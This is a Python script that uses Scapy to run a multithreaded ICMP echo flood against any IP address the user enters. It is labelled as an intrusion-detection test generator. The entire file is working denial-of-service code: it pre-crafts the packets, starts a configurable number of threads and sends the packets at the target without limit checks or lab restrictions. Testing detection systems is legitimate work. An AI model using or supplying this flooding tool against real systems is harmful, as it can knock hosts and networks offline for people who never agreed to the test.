import threading
from scapy.all import IP, ICMP, send
import sys

def icmp_spammer(thread_id, ip, packets):
    """
    The worker function for each thread. Sends a sequence of ICMP Echo Requests.

    :param thread_id: Unique identifier for the thread (for logging).
    :param ip: The target IP address to flood.
    :param packets: Number of packets this specific thread should send.
    """
    print(f"[Thread {thread_id}] Starting flooding...")
    
    # Pre-craft the packet outside the loop to save CPU cycles
    pkt = IP(dst=ip) / ICMP()
    
    for _ in range(packets):
        # verbose=False ensures the console isn't flooded with Scapy logs
        send(pkt, verbose=False)

    print(f"[Thread {thread_id}] Workload finished.")

def run_flood(ip, threads, packets):
    """
    Orchestrates the multithreaded flood attack.

    :param ip: Target destination IP.
    :param threads: Total number of concurrent threads to spawn.
    :param packets: Packets per thread to be dispatched.
    """
    print(f"\n[!] Initiating ICMP Flood")
    print(f"Target:  {ip}")
    print(f"Configuration: {threads} threads x {packets} packets per thread\n")

    thread_list = []

    for thread_num in range(threads):
        current_thread = threading.Thread(target=icmp_spammer, args=(thread_num + 1, ip, packets))
        current_thread.start()
        thread_list.append(current_thread)

    # Wait for all threads to complete their task
    for current_thread in thread_list:
        current_thread.join()

    print("\nICMP Flood Simulation Completed.")

def get_int(prompt, default, minimum=1):
    """
    Helper function to validate and retrieve integer inputs from the user.

    :param prompt: The message to display.
    :param default: Default value if input is empty.
    :param minimum: The lowest acceptable value.
    :return: Validated integer.
    """
    while True:
        try:
            user_input = input(f"{prompt} (default {default}): ").strip()
            if not user_input:
                return default
            
            value = int(user_input)
            if value >= minimum:
                return value
            
            print(f"[!] Value must be >= {minimum}")
        except ValueError:
            print("[!] Invalid input. Please enter a numeric value.")

def main():
    """
    Main entry point for the ICMP Flood tester.
    Collects parameters and launches the attack scenarios.
    """
    print("IDPS Test Suite: ICMP Flood Generator")
    
    try:
        target_ip = input("Enter Target IP [192.168.1.1]: ").strip() or "192.168.1.1"
        num_threads = get_int("Number of Threads", default=10)
        num_packets = get_int("Packets per Thread", default=100)

        run_flood(target_ip, num_threads, num_packets)

    except KeyboardInterrupt:
        print("\n[!] Operation aborted by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()